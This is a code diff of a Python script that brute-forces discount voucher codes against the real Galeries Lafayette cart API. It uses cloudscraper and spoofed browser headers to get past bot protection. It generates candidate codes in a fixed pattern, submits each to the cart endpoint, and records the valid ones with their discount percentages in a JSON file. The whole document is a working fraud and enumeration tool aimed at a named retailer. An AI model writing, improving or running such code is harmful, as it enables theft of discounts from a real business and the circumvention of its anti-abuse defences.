@@ -2,16 +2,15 @@ import itertools
 import json
 import os
 import time
+import string
 
 import cloudscraper
+import requests
 from bs4 import BeautifulSoup
 
 BASE_PRICE=205
-FILE_NAME="vouchers_xxx.json"
-
-
-def get_headers():
-    return {
+FILE_NAME= "vouchers_x00xxx.json"
+HEADERS = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0',
         'Accept': '*/*',
         'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
@@ -30,10 +29,12 @@ def get_headers():
     }
 
 
-def put_voucher(voucher_code: str, session: cloudscraper.CloudScraper):
-    url = "https://www.galerieslafayette.com/ajax/cart/voucher/" + voucher_code
+
+
+def put_voucher(voucher_code: str, scraper: cloudscraper.CloudScraper):
+    url = f"https://www.galerieslafayette.com/ajax/cart/voucher/{voucher_code}"
     try:
-        response = session.put(url=url, headers=get_headers(), allow_redirects=False).text
+        response = scraper.put(url=url, headers=HEADERS, allow_redirects=False).text
 
         return None if 'Ce code n&#39;est pas valide' in response else response
 
@@ -42,10 +43,10 @@ def put_voucher(voucher_code: str, session: cloudscraper.CloudScraper):
         return None
 
 
-def delete_voucher(session: cloudscraper.CloudScraper):
+def delete_voucher(scraper: cloudscraper.CloudScraper):
     url = "https://www.galerieslafayette.com/ajax/cart/vouchers"
     try:
-        return session.delete(url=url, headers=get_headers(), allow_redirects=False).text
+        return scraper.delete(url=url, headers=HEADERS, allow_redirects=False).text
 
     except Exception as e:
         print(f"Unable to put url {url} due to {e.__class__}.")
@@ -53,19 +54,23 @@ def delete_voucher(session: cloudscraper.CloudScraper):
 
 
 def producer():
-    number = "0123456789"
-    letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-    base_letters = letters
+    digits = string.digits
+    letters = string.ascii_uppercase
+    choices = digits
 
     # generate list from 1 to 3 letters
-    for i in range(1, 4):
-        for j in itertools.product(letters, repeat=i):
-            yield "".join(j)
+    # for i in range(1, 4):
+    #     for j in itertools.product(choices, repeat=i):
+    #         yield "".join(j)
 
-    # for a in base_letters:
-    #     for b in base_letters:
-    #         for c in base_letters:
-    #             yield f"000{a}{b}{c}"
+
+    for a in choices:
+        if a == "0":
+            continue
+        for b in choices:
+            for c in choices:
+                for d in choices:
+                    yield f"{a}00{b}{c}{d}"
 
 
 def main():
@@ -76,27 +81,28 @@ def main():
 
     with open(FILE_NAME, "r") as f:
         vouchers = json.load(f)
-    scraper = cloudscraper.create_scraper()
-    session = scraper.create_scraper()
-    delete_voucher(session)
+    session = requests.session()
+    scraper = cloudscraper.create_scraper(sess=session)
+    delete_voucher(scraper)
     for index, voucher in enumerate(producer()):
         start_time = time.time()
-        response = put_voucher(voucher, session)
+        response = put_voucher(voucher, scraper)
         print(voucher, end=" ")
         if response is not None:
+
             soup = BeautifulSoup(response, "html.parser")
             div = soup.find("div", {"class": "voucher-display-row"})
             if div is not None:
                 text_list = div.text.split('\n')
-                price = text_list[10].replace('-', '').replace('€', '').strip().replace(',', '.')
+                price = text_list[10].strip().replace('-', '').replace('€', '').replace(',', '.')
                 percent = int(float(price) / BASE_PRICE * 100)
-                text = f"{text_list[13]} -  {price}€ ({percent}%)"
+                text = f"{text_list[13]} | {BASE_PRICE}€ - {price}€  = -{percent}%"
                 print('OK ' + text, end=" ")
+                delete_voucher(scraper)
                 if voucher not in vouchers:
                     vouchers[voucher] = text
-                delete_voucher(session)
-                with open(FILE_NAME, "w") as f:
-                    json.dump(vouchers, f, indent=4, sort_keys=True, ensure_ascii=False)
+                    with open(FILE_NAME, "w") as f:
+                        json.dump(vouchers, f, indent=4, sort_keys=True, ensure_ascii=False)
             else:
                 print("KO", end=" ")
         else:
